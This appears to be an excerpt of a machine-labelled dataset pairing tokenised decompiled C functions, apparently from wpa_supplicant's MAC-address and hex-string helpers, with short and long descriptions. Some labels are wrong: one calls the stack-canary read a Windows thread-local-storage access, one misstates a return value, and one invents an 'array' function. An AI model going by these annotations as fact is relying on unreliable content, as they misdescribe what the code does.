        "docstring_tokens": [
            "This",
            "code",
            "converts",
            "a",
            "compact",
            "hexadecimal",
            "string",
            "representation",
            "of",
            "a",
            "MAC",
            "address",
            "into",
            "a",
            "6-byte",
            "address",
            "array",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ")",
            "{",
            "char",
            "*",
            "v2",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "_BYTE",
            "*",
            "v5",
            ";",
            "char",
            "*",
            "v8",
            ";",
            "int",
            "i",
            ";",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "5",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v2",
            "=",
            "a1",
            ";",
            "v8",
            "=",
            "a1",
            "+",
            "1",
            ";",
            "v10",
            "=",
            "hex2num",
            "(",
            "*",
            "v2",
            ")",
            ";",
            "if",
            "(",
            "v10",
            "<",
            "0",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v4",
            "=",
            "v8",
            ";",
            "a1",
            "=",
            "v8",
            "+",
            "1",
            ";",
            "v11",
            "=",
            "hex2num",
            "(",
            "*",
            "v4",
            ")",
            ";",
            "if",
            "(",
            "v11",
            "<",
            "0",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v5",
            "=",
            "a2",
            "+",
            "+",
            ";",
            "*",
            "v5",
            "=",
            "v11",
            "|",
            "(",
            "16",
            "*",
            "v10",
            ")",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function `hwaddr_compact_aton` which converts a compact hexadecimal string representing a hardware address into bytes, storing the result in an array, with error handling for invalid input characters."
    },
    {
        "id": 497,
        "docstring_tokens": [
            "The",
            "code",
            "takes",
            "a",
            "string",
            "representing",
            "a",
            "hardware",
            "address",
            "in",
            "text",
            "format",
            "and",
            "converts",
            "it",
            "into",
            "a",
            "6-byte",
            "array",
            "of",
            "u8",
            "values",
            ",",
            "returning",
            "the",
            "number",
            "of",
            "characters",
            "processed",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ")",
            "{",
            "char",
            "*",
            "v2",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "_BYTE",
            "*",
            "v5",
            ";",
            "int",
            "i",
            ";",
            "int",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "char",
            "*",
            "v10",
            ";",
            "char",
            "*",
            "v11",
            ";",
            "v10",
            "=",
            "a1",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "5",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "while",
            "(",
            "*",
            "v10",
            "=",
            "=",
            "58",
            "|",
            "|",
            "*",
            "v10",
            "=",
            "=",
            "46",
            "|",
            "|",
            "*",
            "v10",
            "=",
            "=",
            "45",
            ")",
            "+",
            "+",
            "v10",
            ";",
            "v2",
            "=",
            "v10",
            ";",
            "v11",
            "=",
            "v10",
            "+",
            "1",
            ";",
            "v8",
            "=",
            "hex2num",
            "(",
            "*",
            "v2",
            ")",
            ";",
            "if",
            "(",
            "v8",
            "<",
            "0",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v4",
            "=",
            "v11",
            ";",
            "v10",
            "=",
            "v11",
            "+",
            "1",
            ";",
            "v9",
            "=",
            "hex2num",
            "(",
            "*",
            "v4",
            ")",
            ";",
            "if",
            "(",
            "v9",
            "<",
            "0",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v5",
            "=",
            "a2",
            "+",
            "+",
            ";",
            "*",
            "v5",
            "=",
            "v9",
            "|",
            "(",
            "16",
            "*",
            "v8",
            ")",
            ";",
            "}",
            "return",
            "v10",
            "-",
            "a1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function `hwaddr_aton2` that converts a string `a1` representing a hardware address (MAC address) in a specific format (colon, dot, or dash-separated hexadecimal pairs) into a binary representation stored in `a2`, returning the number of characters processed or `0xFFFFFFFF` if there are invalid characters in the input."
    },
    {
        "id": 498,
        "docstring_tokens": [
            "This",
            "code",
            "converts",
            "a",
            "hexadecimal",
            "string",
            "to",
            "binary",
            "and",
            "stores",
            "it",
            "in",
            "a",
            "buffer",
            "of",
            "a",
            "specified",
            "length",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ",",
            "unsigned",
            "__int64",
            "a3",
            ")",
            "{",
            "_BYTE",
            "*",
            "v4",
            ";",
            "int",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "i",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "a3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v6",
            "=",
            "hex2byte",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "v6",
            "<",
            "0",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v4",
            "=",
            "a2",
            "+",
            "+",
            ";",
            "*",
            "v4",
            "=",
            "v6",
            ";",
            "a1",
            "+",
            "=",
            "2",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function `hexstr2bin` which converts a hexadecimal string `a1` to binary representation stored in `a2`, with a length specified by `a3`, returning 0 if successful and 0xFFFFFFFFFFFFFFFF if any invalid hexadecimal character is encountered."
    },
    {
        "id": 499,
        "docstring_tokens": [
            "This",
            "code",
            "takes",
            "a",
            "MAC",
            "address",
            "and",
            "a",
            "mask",
            ",",
            "checks",
            "if",
            "the",
            "mask",
            "is",
            "not",
            "all",
            "1s",
            ",",
            "and",
            "prints",
            "the",
            "MAC",
            "address",
            "and",
            "mask",
            "if",
            "needed",
            ",",
            "or",
            "just",
            "the",
            "MAC",
            "address",
            "if",
            "all",
            "1s",
            ",",
            "returning",
            "-1",
            "if",
            "there",
            "is",
            "an",
            "error",
            "in",
            "printing",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "__int64",
            "a2",
            ",",
            "unsigned",
            "__int8",
            "*",
            "a3",
            ",",
            "unsigned",
            "__int8",
            "*",
            "a4",
            ")",
            "{",
            "int",
            "v5",
            ";",
            "unsigned",
            "int",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "i",
            ";",
            "v5",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "=",
            "5",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "a4",
            "[",
            "i",
            "]",
            "!",
            "=",
            "0xFF",
            ")",
            "{",
            "v5",
            "=",
            "1",
            ";",
            "break",
            ";",
            "}",
            "}",
            "if",
            "(",
            "v5",
            ")",
            "v6",
            "=",
            "os_snprintf",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "\"%02x:%02x:%02x:%02x:%02x:%02x/%02x:%02x:%02x:%02x:%02x:%02x\"",
            ",",
            "*",
            "a3",
            ",",
            "a3",
            "[",
            "1",
            "]",
            ",",
            "a3",
            "[",
            "2",
            "]",
            ",",
            "a3",
            "[",
            "3",
            "]",
            ",",
            "a3",
            "[",
            "4",
            "]",
            ",",
            "a3",
            "[",
            "5",
            "]",
            ",",
            "*",
            "a4",
            ",",
            "a4",
            "[",
            "1",
            "]",
            ",",
            "a4",
            "[",
            "2",
            "]",
            ",",
            "a4",
            "[",
            "3",
            "]",
            ",",
            "a4",
            "[",
            "4",
            "]",
            ",",
            "a4",
            "[",
            "5",
            "]",
            ")",
            ";",
            "else",
            "v6",
            "=",
            "os_snprintf",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "\"%02x:%02x:%02x:%02x:%02x:%02x\"",
            ",",
            "*",
            "a3",
            ",",
            "a3",
            "[",
            "1",
            "]",
            ",",
            "a3",
            "[",
            "2",
            "]",
            ",",
            "a3",
            "[",
            "3",
            "]",
            ",",
            "a3",
            "[",
            "4",
            "]",
            ",",
            "a3",
            "[",
            "5",
            "]",
            ")",
            ";",
            "if",
            "(",
            "os_snprintf_error",
            "(",
            "a2",
            ",",
            "v6",
            ")",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "else",
            "return",
            "v6",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `os_snprintf` function is designed to print formatted data into a character buffer with a specified maximum length, similar to the standard C library function `snprintf`, but with platform-specific considerations and potentially additional functionality provided by the `os.h` header file.",
            "The `_snprintf_error` function is used to handle potential errors that may occur when formatting strings with `os_snprintf`, ensuring robustness and error handling in string formatting operations."
        ],
        "longer_label": "The code is a function `hwaddr_mask_txt` which formats MAC addresses and their corresponding masks into a text representation, using `os_snprintf` for formatting with error handling, and considering the presence of non-FF bytes in the mask to determine whether to include the mask part in the output."
    },
    {
        "id": 500,
        "docstring_tokens": [
            "The",
            "function",
            "'inc_byte_array",
            "'",
            "increments",
            "each",
            "element",
            "in",
            "a",
            "byte",
            "array",
            "starting",
            "from",
            "the",
            "end",
            "until",
            "a",
            "non-zero",
            "value",
            "is",
            "reached",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "int",
            "a2",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "int",
            "i",
            ";",
            "result",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "a2",
            "-",
            "1",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "a2",
            "-",
            "1",
            ";",
            "i",
            ">",
            "=",
            "0",
            ";",
            "-",
            "-",
            "i",
            ")",
            "{",
            "result",
            "=",
            "(",
            "unsigned",
            "__int8",
            ")",
            "+",
            "+",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "i",
            "+",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "result",
            ")",
            "break",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"array\" function appears to initialize arrays or structs, likely related to device handling or message processing in a larger system, with the provided code snippets demonstrating memory allocation and manipulation."
        ],
        "longer_label": "The provided code defines a function, `inc_byte_array`, which increments elements of a byte array starting from a specified index until a non-zero value is encountered, likely used in a larger system for device handling or message processing."
    },
    {
        "id": 501,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "formats",
            "and",
            "prints",
            "data",
            "to",
            "a",
            "buffer",
            ",",
            "ensuring",
            "it",
            "fits",
            "within",
            "the",
            "specified",
            "size",
            "limit",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ",",
            "size_t",
            "a2",
            ",",
            "const",
            "char",
            "*",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ",",
            "__int64",
            "a6",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "int",
            "v7",
            ";",
            "gcc_va_list",
            "arg",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "v10",
            "=",
            "a4",
            ";",
            "v11",
            "=",
            "a5",
            ";",
            "v12",
            "=",
            "a6",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "a2",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v7",
            "=",
            "vsnprintf",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "a3",
            ",",
            "arg",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "<",
            "0",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "a2",
            ">",
            "v7",
            ")",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "v7",
            ";",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "a2",
            "-",
            "1",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a quadword (64 bits) value from a specific offset in the FS segment register, which is typically used in low-level programming for accessing thread-local storage (TLS) or other specialized memory regions on Windows platforms."
        ],
        "longer_label": "The `wpa_scnprintf` function formats a string according to a format specifier and a variable number of arguments, limiting the output to a maximum length specified by `a2`, and utilizes low-level programming techniques, including accessing thread-local storage, to ensure proper functionality."
    }
]